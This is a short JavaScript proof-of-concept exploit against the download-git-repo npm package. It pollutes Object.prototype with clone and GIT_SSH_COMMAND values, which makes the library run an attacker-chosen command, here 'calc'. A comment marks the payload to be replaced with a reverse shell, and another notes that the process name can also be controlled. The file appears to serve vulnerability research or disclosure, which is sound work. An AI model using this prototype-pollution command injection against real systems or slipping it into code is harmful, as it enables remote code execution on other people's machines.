const download = require('download-git-repo');

// TODO: replace to reverse shell
Object.prototype.clone = true;
Object.prototype.GIT_SSH_COMMAND = "calc";
//Object.prototype.git = "calc";  // we can also control a process name

download('user/repo', 'test/tmp', function (err) {
  console.log(err ? 'Error' : 'Success')
})